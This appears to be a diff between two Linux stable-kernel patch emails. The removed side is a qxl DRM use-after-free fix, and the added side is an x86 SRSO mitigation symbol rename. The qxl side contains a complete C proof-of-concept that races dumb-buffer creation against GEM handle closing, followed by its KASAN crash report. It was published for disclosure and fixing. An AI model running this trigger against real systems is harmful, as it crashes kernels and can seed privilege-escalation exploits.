@@ -1,26 +1,26 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 12E0311703
-	for <patches@lists.linux.dev>; Mon, 21 Aug 2023 19:58:18 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 87164C433C8;
-	Mon, 21 Aug 2023 19:58:17 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BCC4611703
+	for <patches@lists.linux.dev>; Mon, 21 Aug 2023 19:58:20 +0000 (UTC)
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 3F5FEC433C7;
+	Mon, 21 Aug 2023 19:58:20 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1692647897;
-	bh=XrK4Jz3gG5IrPcO15IBCqd4eno64jSGrUZXvAD484DA=;
+	s=korg; t=1692647900;
+	bh=bPztwVCb0v+vJMrVsKt64TLKU7NycErmSZBrzsG40qQ=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=ZLP2Cxf5GqLp7PIKOuPVH4v+35RTWv9nHSQE4KV9xqAgEypwwQTjc2wrqmoG+PlPf
-	 L2N3MvZftESUXtCzEmmidi4GCQ8fBw/1iLIQ6jkkxAPa5yC2yXtrzmMGu/s/mS2uOn
-	 lFVqURVFlbZEtPEE9MeCKQgx2P0+oPLm2eVO7eK4=
+	b=sGkCg1sychJwupsN0/ya1eAN8AVd2cDBxtRDhutpyAtDhr1idjwCifE0SqiHbm020
+	 3IQ+eNspJUliWliE/Xo9+s3s9mMUYJituUz08jMSPOsDNTU3CqhAu6VtXm4bDq57Kg
+	 JkJ5y1vGi6MOUVi2Ym9F7sGHx/Fx9r266QX9MnXI=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Wander Lairson Costa <wander@redhat.com>,
-	Dave Airlie <airlied@redhat.com>
-Subject: [PATCH 6.1 160/194] drm/qxl: fix UAF on handle creation
-Date: Mon, 21 Aug 2023 21:42:19 +0200
-Message-ID: <20230821194129.735678045@linuxfoundation.org>
+	"Peter Zijlstra (Intel)" <peterz@infradead.org>,
+	"Borislav Petkov (AMD)" <bp@alien8.de>
+Subject: [PATCH 6.1 178/194] x86/cpu: Rename srso_(.*)_alias to srso_alias_\1
+Date: Mon, 21 Aug 2023 21:42:37 +0200
+Message-ID: <20230821194130.545439586@linuxfoundation.org>
 X-Mailer: git-send-email 2.41.0
 In-Reply-To: <20230821194122.695845670@linuxfoundation.org>
 References: <20230821194122.695845670@linuxfoundation.org>
@@ -34,352 +34,155 @@ MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-From: Wander Lairson Costa <wander@redhat.com>
+From: Peter Zijlstra <peterz@infradead.org>
 
-commit c611589b4259ed63b9b77be6872b1ce07ec0ac16 upstream.
+commit 42be649dd1f2eee6b1fb185f1a231b9494cf095f upstream.
 
-qxl_mode_dumb_create() dereferences the qobj returned by
-qxl_gem_object_create_with_handle(), but the handle is the only one
-holding a reference to it.
+For a more consistent namespace.
 
-A potential attacker could guess the returned handle value and closes it
-between the return of qxl_gem_object_create_with_handle() and the qobj
-usage, triggering a use-after-free scenario.
+  [ bp: Fixup names in the doc too. ]
 
-Reproducer:
-
-int dri_fd =-1;
-struct drm_mode_create_dumb arg = {0};
-
-void gem_close(int handle);
-
-void* trigger(void* ptr)
-{
-	int ret;
-	arg.width = arg.height = 0x20;
-	arg.bpp = 32;
-	ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &arg);
-	if(ret)
-	{
-		perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-		exit(-1);
-	}
-	gem_close(arg.handle);
-	while(1) {
-		struct drm_mode_create_dumb args = {0};
-		args.width = args.height = 0x20;
-		args.bpp = 32;
-		ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &args);
-		if (ret) {
-			perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-			exit(-1);
-		}
-
-		printf("[*] DRM_IOCTL_MODE_CREATE_DUMB created, %d\n", args.handle);
-		gem_close(args.handle);
-	}
-	return NULL;
-}
-
-void gem_close(int handle)
-{
-	struct drm_gem_close args;
-	args.handle = handle;
-	int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &args); // gem close handle
-	if (!ret)
-		printf("gem close handle %d\n", args.handle);
-}
-
-int main(void)
-{
-	dri_fd= open("/dev/dri/card0", O_RDWR);
-	printf("fd:%d\n", dri_fd);
-
-	if(dri_fd == -1)
-		return -1;
-
-	pthread_t tid1;
-
-	if(pthread_create(&tid1,NULL,trigger,NULL)){
-		perror("[*] thread_create tid1\n");
-		return -1;
-	}
-	while (1)
-	{
-		gem_close(arg.handle);
-	}
-	return 0;
-}
-
-This is a KASAN report:
-
-==================================================================
-BUG: KASAN: slab-use-after-free in qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-Write of size 1 at addr ffff88801136c240 by task poc/515
-
-CPU: 1 PID: 515 Comm: poc Not tainted 6.3.0 #3
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-debian-1.16.0-4 04/01/2014
-Call Trace:
-<TASK>
-__dump_stack linux/lib/dump_stack.c:88
-dump_stack_lvl+0x48/0x70 linux/lib/dump_stack.c:106
-print_address_description linux/mm/kasan/report.c:319
-print_report+0xd2/0x660 linux/mm/kasan/report.c:430
-kasan_report+0xd2/0x110 linux/mm/kasan/report.c:536
-__asan_report_store1_noabort+0x17/0x30 linux/mm/kasan/report_generic.c:383
-qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-RIP: 0033:0x7ff5004ff5f7
-Code: 00 00 00 48 8b 05 99 c8 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 69 c8 0d 00 f7 d8 64 89 01 48
-
-RSP: 002b:00007ff500408ea8 EFLAGS: 00000286 ORIG_RAX: 0000000000000010
-RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff5004ff5f7
-RDX: 00007ff500408ec0 RSI: 00000000c02064b2 RDI: 0000000000000003
-RBP: 00007ff500408ef0 R08: 0000000000000000 R09: 000000000000002a
-R10: 0000000000000000 R11: 0000000000000286 R12: 00007fff1c6cdafe
-R13: 00007fff1c6cdaff R14: 00007ff500408fc0 R15: 0000000000802000
-</TASK>
-
-Allocated by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_alloc_info+0x1e/0x40 linux/mm/kasan/generic.c:510
-____kasan_kmalloc linux/mm/kasan/common.c:374
-__kasan_kmalloc+0xc3/0xd0 linux/mm/kasan/common.c:383
-kasan_kmalloc linux/./include/linux/kasan.h:196
-kmalloc_trace+0x48/0xc0 linux/mm/slab_common.c:1066
-kmalloc linux/./include/linux/slab.h:580
-kzalloc linux/./include/linux/slab.h:720
-qxl_bo_create+0x11a/0x610 linux/drivers/gpu/drm/qxl/qxl_object.c:124
-qxl_gem_object_create+0xd9/0x360 linux/drivers/gpu/drm/qxl/qxl_gem.c:58
-qxl_gem_object_create_with_handle+0xa1/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:89
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-Freed by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_free_info+0x2e/0x60 linux/mm/kasan/generic.c:521
-____kasan_slab_free linux/mm/kasan/common.c:236
-____kasan_slab_free+0x180/0x1f0 linux/mm/kasan/common.c:200
-__kasan_slab_free+0x12/0x30 linux/mm/kasan/common.c:244
-kasan_slab_free linux/./include/linux/kasan.h:162
-slab_free_hook linux/mm/slub.c:1781
-slab_free_freelist_hook+0xd2/0x1a0 linux/mm/slub.c:1807
-slab_free linux/mm/slub.c:3787
-__kmem_cache_free+0x196/0x2d0 linux/mm/slub.c:3800
-kfree+0x78/0x120 linux/mm/slab_common.c:1019
-qxl_ttm_bo_destroy+0x140/0x1a0 linux/drivers/gpu/drm/qxl/qxl_object.c:49
-ttm_bo_release+0x678/0xa30 linux/drivers/gpu/drm/ttm/ttm_bo.c:381
-kref_put linux/./include/linux/kref.h:65
-ttm_bo_put+0x50/0x80 linux/drivers/gpu/drm/ttm/ttm_bo.c:393
-qxl_gem_object_free+0x3e/0x60 linux/drivers/gpu/drm/qxl/qxl_gem.c:42
-drm_gem_object_free+0x5c/0x90 linux/drivers/gpu/drm/drm_gem.c:974
-kref_put linux/./include/linux/kref.h:65
-__drm_gem_object_put linux/./include/drm/drm_gem.h:431
-drm_gem_object_put linux/./include/drm/drm_gem.h:444
-qxl_gem_object_create_with_handle+0x151/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:100
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-The buggy address belongs to the object at ffff88801136c000
-which belongs to the cache kmalloc-1k of size 1024
-The buggy address is located 576 bytes inside of
-freed 1024-byte region [ffff88801136c000, ffff88801136c400)
-
-The buggy address belongs to the physical page:
-page:0000000089fc329b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11368
-head:0000000089fc329b order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
-raw: 000fffffc0010200 ffff888007841dc0 dead000000000122 0000000000000000
-raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
-page dumped because: kasan: bad access detected
-
-Memory state around the buggy address:
-ffff88801136c100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
->ffff88801136c200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-^
-ffff88801136c280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-==================================================================
-Disabling lock debugging due to kernel taint
-
-Instead of returning a weak reference to the qxl_bo object, return the
-created drm_gem_object and let the caller decrement the reference count
-when it no longer needs it. As a convenience, if the caller is not
-interested in the gobj object, it can pass NULL to the parameter and the
-reference counting is descremented internally.
-
-The bug and the reproducer were originally found by the Zero Day Initiative project (ZDI-CAN-20940).
-
-Link: https://www.zerodayinitiative.com/
-Signed-off-by: Wander Lairson Costa <wander@redhat.com>
-Cc: stable@vger.kernel.org
-Reviewed-by: Dave Airlie <airlied@redhat.com>
-Signed-off-by: Dave Airlie <airlied@redhat.com>
-Link: https://patchwork.freedesktop.org/patch/msgid/20230814165119.90847-1-wander@redhat.com
+Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>
+Signed-off-by: Borislav Petkov (AMD) <bp@alien8.de>
+Link: https://lore.kernel.org/r/20230814121148.976236447@infradead.org
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- drivers/gpu/drm/qxl/qxl_drv.h   |    2 +-
- drivers/gpu/drm/qxl/qxl_dumb.c  |    5 ++++-
- drivers/gpu/drm/qxl/qxl_gem.c   |   25 +++++++++++++++++--------
- drivers/gpu/drm/qxl/qxl_ioctl.c |    6 ++----
- 4 files changed, 24 insertions(+), 14 deletions(-)
+ Documentation/admin-guide/hw-vuln/srso.rst |    4 ++--
+ arch/x86/include/asm/nospec-branch.h       |    4 ++--
+ arch/x86/kernel/vmlinux.lds.S              |    8 ++++----
+ arch/x86/lib/retpoline.S                   |   26 +++++++++++++-------------
+ 4 files changed, 21 insertions(+), 21 deletions(-)
 
---- a/drivers/gpu/drm/qxl/qxl_drv.h
-+++ b/drivers/gpu/drm/qxl/qxl_drv.h
-@@ -312,7 +312,7 @@ int qxl_gem_object_create_with_handle(st
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle);
- void qxl_gem_object_free(struct drm_gem_object *gobj);
- int qxl_gem_object_open(struct drm_gem_object *obj, struct drm_file *file_priv);
---- a/drivers/gpu/drm/qxl/qxl_dumb.c
-+++ b/drivers/gpu/drm/qxl/qxl_dumb.c
-@@ -34,6 +34,7 @@ int qxl_mode_dumb_create(struct drm_file
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct qxl_bo *qobj;
-+	struct drm_gem_object *gobj;
- 	uint32_t handle;
- 	int r;
- 	struct qxl_surface surf;
-@@ -62,11 +63,13 @@ int qxl_mode_dumb_create(struct drm_file
+--- a/Documentation/admin-guide/hw-vuln/srso.rst
++++ b/Documentation/admin-guide/hw-vuln/srso.rst
+@@ -124,8 +124,8 @@ sequence.
+ To ensure the safety of this mitigation, the kernel must ensure that the
+ safe return sequence is itself free from attacker interference.  In Zen3
+ and Zen4, this is accomplished by creating a BTB alias between the
+-untraining function srso_untrain_ret_alias() and the safe return
+-function srso_safe_ret_alias() which results in evicting a potentially
++untraining function srso_alias_untrain_ret() and the safe return
++function srso_alias_safe_ret() which results in evicting a potentially
+ poisoned BTB entry and using that safe one for all function returns.
  
- 	r = qxl_gem_object_create_with_handle(qdev, file_priv,
- 					      QXL_GEM_DOMAIN_CPU,
--					      args->size, &surf, &qobj,
-+					      args->size, &surf, &gobj,
- 					      &handle);
- 	if (r)
- 		return r;
-+	qobj = gem_to_qxl_bo(gobj);
- 	qobj->is_dumb = true;
-+	drm_gem_object_put(gobj);
- 	args->pitch = pitch;
- 	args->handle = handle;
- 	return 0;
---- a/drivers/gpu/drm/qxl/qxl_gem.c
-+++ b/drivers/gpu/drm/qxl/qxl_gem.c
-@@ -72,32 +72,41 @@ int qxl_gem_object_create(struct qxl_dev
- 	return 0;
- }
+ In older Zen1 and Zen2, this is accomplished using a reinterpretation
+--- a/arch/x86/include/asm/nospec-branch.h
++++ b/arch/x86/include/asm/nospec-branch.h
+@@ -195,7 +195,7 @@
  
-+/*
-+ * If the caller passed a valid gobj pointer, it is responsible to call
-+ * drm_gem_object_put() when it no longer needs to acess the object.
-+ *
-+ * If gobj is NULL, it is handled internally.
-+ */
- int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
- 				      struct drm_file *file_priv,
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle)
- {
--	struct drm_gem_object *gobj;
- 	int r;
-+	struct drm_gem_object *local_gobj;
+ #ifdef CONFIG_CPU_SRSO
+ 	ALTERNATIVE_2 "", "call srso_untrain_ret", X86_FEATURE_SRSO, \
+-			  "call srso_untrain_ret_alias", X86_FEATURE_SRSO_ALIAS
++			  "call srso_alias_untrain_ret", X86_FEATURE_SRSO_ALIAS
+ #endif
+ .endm
  
--	BUG_ON(!qobj);
- 	BUG_ON(!handle);
+@@ -222,7 +222,7 @@ extern void srso_alias_return_thunk(void
  
- 	r = qxl_gem_object_create(qdev, size, 0,
- 				  domain,
- 				  false, false, surf,
--				  &gobj);
-+				  &local_gobj);
- 	if (r)
- 		return -ENOMEM;
--	r = drm_gem_handle_create(file_priv, gobj, handle);
-+	r = drm_gem_handle_create(file_priv, local_gobj, handle);
- 	if (r)
- 		return r;
--	/* drop reference from allocate - handle holds it now */
--	*qobj = gem_to_qxl_bo(gobj);
--	drm_gem_object_put(gobj);
-+
-+	if (gobj)
-+		*gobj = local_gobj;
-+	else
-+		/* drop reference from allocate - handle holds it now */
-+		drm_gem_object_put(local_gobj);
-+
- 	return 0;
- }
+ extern void retbleed_untrain_ret(void);
+ extern void srso_untrain_ret(void);
+-extern void srso_untrain_ret_alias(void);
++extern void srso_alias_untrain_ret(void);
  
---- a/drivers/gpu/drm/qxl/qxl_ioctl.c
-+++ b/drivers/gpu/drm/qxl/qxl_ioctl.c
-@@ -38,7 +38,6 @@ int qxl_alloc_ioctl(struct drm_device *d
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc *qxl_alloc = data;
- 	int ret;
--	struct qxl_bo *qobj;
- 	uint32_t handle;
- 	u32 domain = QXL_GEM_DOMAIN_VRAM;
+ extern void entry_ibpb(void);
  
-@@ -50,7 +49,7 @@ int qxl_alloc_ioctl(struct drm_device *d
- 						domain,
- 						qxl_alloc->size,
- 						NULL,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
-@@ -386,7 +385,6 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc_surf *param = data;
--	struct qxl_bo *qobj;
- 	int handle;
- 	int ret;
- 	int size, actual_stride;
-@@ -406,7 +404,7 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- 						QXL_GEM_DOMAIN_SURFACE,
- 						size,
- 						&surf,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
+--- a/arch/x86/kernel/vmlinux.lds.S
++++ b/arch/x86/kernel/vmlinux.lds.S
+@@ -141,10 +141,10 @@ SECTIONS
+ 
+ #ifdef CONFIG_CPU_SRSO
+ 		/*
+-		 * See the comment above srso_untrain_ret_alias()'s
++		 * See the comment above srso_alias_untrain_ret()'s
+ 		 * definition.
+ 		 */
+-		. = srso_untrain_ret_alias | (1 << 2) | (1 << 8) | (1 << 14) | (1 << 20);
++		. = srso_alias_untrain_ret | (1 << 2) | (1 << 8) | (1 << 14) | (1 << 20);
+ 		*(.text.__x86.rethunk_safe)
+ #endif
+ 		ALIGN_ENTRY_TEXT_END
+@@ -523,8 +523,8 @@ INIT_PER_CPU(irq_stack_backing_store);
+  * Instead do: (A | B) - (A & B) in order to compute the XOR
+  * of the two function addresses:
+  */
+-. = ASSERT(((ABSOLUTE(srso_untrain_ret_alias) | srso_safe_ret_alias) -
+-		(ABSOLUTE(srso_untrain_ret_alias) & srso_safe_ret_alias)) == ((1 << 2) | (1 << 8) | (1 << 14) | (1 << 20)),
++. = ASSERT(((ABSOLUTE(srso_alias_untrain_ret) | srso_alias_safe_ret) -
++		(ABSOLUTE(srso_alias_untrain_ret) & srso_alias_safe_ret)) == ((1 << 2) | (1 << 8) | (1 << 14) | (1 << 20)),
+ 		"SRSO function pair won't alias");
+ #endif
+ 
+--- a/arch/x86/lib/retpoline.S
++++ b/arch/x86/lib/retpoline.S
+@@ -76,56 +76,56 @@ SYM_CODE_END(__x86_indirect_thunk_array)
+ #ifdef CONFIG_RETHUNK
+ 
+ /*
+- * srso_untrain_ret_alias() and srso_safe_ret_alias() are placed at
++ * srso_alias_untrain_ret() and srso_alias_safe_ret() are placed at
+  * special addresses:
+  *
+- * - srso_untrain_ret_alias() is 2M aligned
+- * - srso_safe_ret_alias() is also in the same 2M page but bits 2, 8, 14
++ * - srso_alias_untrain_ret() is 2M aligned
++ * - srso_alias_safe_ret() is also in the same 2M page but bits 2, 8, 14
+  * and 20 in its virtual address are set (while those bits in the
+- * srso_untrain_ret_alias() function are cleared).
++ * srso_alias_untrain_ret() function are cleared).
+  *
+  * This guarantees that those two addresses will alias in the branch
+  * target buffer of Zen3/4 generations, leading to any potential
+  * poisoned entries at that BTB slot to get evicted.
+  *
+- * As a result, srso_safe_ret_alias() becomes a safe return.
++ * As a result, srso_alias_safe_ret() becomes a safe return.
+  */
+ #ifdef CONFIG_CPU_SRSO
+ 	.section .text.__x86.rethunk_untrain
+ 
+-SYM_START(srso_untrain_ret_alias, SYM_L_GLOBAL, SYM_A_NONE)
++SYM_START(srso_alias_untrain_ret, SYM_L_GLOBAL, SYM_A_NONE)
+ 	UNWIND_HINT_FUNC
+ 	ANNOTATE_NOENDBR
+ 	ASM_NOP2
+ 	lfence
+ 	jmp srso_alias_return_thunk
+-SYM_FUNC_END(srso_untrain_ret_alias)
+-__EXPORT_THUNK(srso_untrain_ret_alias)
++SYM_FUNC_END(srso_alias_untrain_ret)
++__EXPORT_THUNK(srso_alias_untrain_ret)
+ 
+ 	.section .text.__x86.rethunk_safe
+ #else
+ /* dummy definition for alternatives */
+-SYM_START(srso_untrain_ret_alias, SYM_L_GLOBAL, SYM_A_NONE)
++SYM_START(srso_alias_untrain_ret, SYM_L_GLOBAL, SYM_A_NONE)
+ 	ANNOTATE_UNRET_SAFE
+ 	ret
+ 	int3
+-SYM_FUNC_END(srso_untrain_ret_alias)
++SYM_FUNC_END(srso_alias_untrain_ret)
+ #endif
+ 
+-SYM_START(srso_safe_ret_alias, SYM_L_GLOBAL, SYM_A_NONE)
++SYM_START(srso_alias_safe_ret, SYM_L_GLOBAL, SYM_A_NONE)
+ 	add $8, %_ASM_SP
+ 	UNWIND_HINT_FUNC
+ 	ANNOTATE_UNRET_SAFE
+ 	ret
+ 	int3
+-SYM_FUNC_END(srso_safe_ret_alias)
++SYM_FUNC_END(srso_alias_safe_ret)
+ 
+ 	.section .text.__x86.return_thunk
+ 
+ SYM_CODE_START(srso_alias_return_thunk)
+ 	UNWIND_HINT_FUNC
+ 	ANNOTATE_NOENDBR
+-	call srso_safe_ret_alias
++	call srso_alias_safe_ret
+ 	ud2
+ SYM_CODE_END(srso_alias_return_thunk)
+ 
 
 
